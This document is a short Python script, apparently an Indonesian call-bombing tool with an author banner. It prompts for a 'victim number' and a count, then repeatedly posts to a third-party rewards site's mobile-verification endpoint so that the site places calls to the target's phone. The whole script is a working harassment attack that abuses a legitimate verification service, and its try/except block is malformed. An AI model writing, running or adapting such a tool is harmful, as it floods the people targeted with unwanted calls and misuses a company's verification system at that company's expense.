import os,sys,requests,time,json,re                      
    from time import sleep
    from requests import post
except ImportError:
    print ("\033[1;97mModule:\033[1;91mNot Installing!!")
    sleep(1)
    print ("\033[1;97mInstall module...")
    sleep(2)
    os.system("pip install mechanize requests bs4")          
    sleep(1)
    print ("\033[1;97mModule:\033[1;92mSuccess Installing..!")
def bersih():
    os.system('clear')
def balik():
    os.system("python call-lock.py")
banner= """
\033[31;1m<▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬>
 \033[32;1m[\033[1;96m•\033[1;90m] \033[32;1mAuthor    \033[1;91m: \033[31;1mFazul Boften
 \033[32;1m[\033[1;96m•\033[1;90m] \033[32;1mYouTube   \033[1;91m: \033[31;1mHtc Ctr gaming
 \033[32;1m[\033[1;96m•\033[1;90m] \033[32;1mGithub    \033[1;91m: \033[31;1mgithub://Faizulboften
\033[31;1m<▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬>
                               \033[31;1m<<•   @ROOT  •>>
\033[31;1m<▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬>"""                               
os.system("clear")
print(banner)
print(" \033[1;90m[\033[1;96m~\033[1;90m] \033[1;95mExample \033[1:91m: \033[1;93m8********")
nomor = input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[31;1mNomor Korban \033[1;90m=\033[1;95m=\033[1;96m> \033[1;92m")
jumlah = int(input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[31;1mJumlah Spam \033[1;90m=\033[1;95m=\033[1;96m> \033[1;92m"))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" \033[1;90m[\033[1;92m•\033[1;90m] \033[32;1mStatus \033[1;90m~\033[1;96m+\033[1;92m> \033[1;95m",(send.json()["message"]))
